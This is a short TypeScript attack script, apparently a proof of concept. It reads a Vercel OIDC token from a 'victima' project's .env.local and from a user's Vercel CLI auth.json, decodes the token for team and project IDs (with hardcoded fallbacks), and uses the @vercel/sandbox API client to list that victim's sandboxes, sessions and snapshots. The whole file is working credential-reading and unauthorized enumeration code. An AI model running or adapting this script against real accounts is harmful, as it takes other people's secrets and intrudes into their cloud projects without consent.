import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
import { APIClient } from "/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js";
const raw = (await import("/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js")).APIClient;
async function main() {
  const client = new raw({ token: VICTIM, teamId, projectId });
  const l: any = await client.listSandboxes({ projectId, limit: 50 });
  const sbxs = l.json?.sandboxes ?? l.json ?? [];
  console.log("total sandboxes:", sbxs.length);
  for (const s of sbxs) console.log(" -", s.name, "| status:", s.status, "| session:", s.currentSessionId);
  // snapshots
  const sn: any = await client.listSnapshots({ projectId, limit: 50 });
  const snaps = sn.json?.snapshots ?? sn.json ?? [];
  console.log("total snapshots:", snaps.length);
  for (const s of snaps.slice(0,5)) console.log(" snap:", s.id, s.status, "source:", s.sourceSessionId);
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
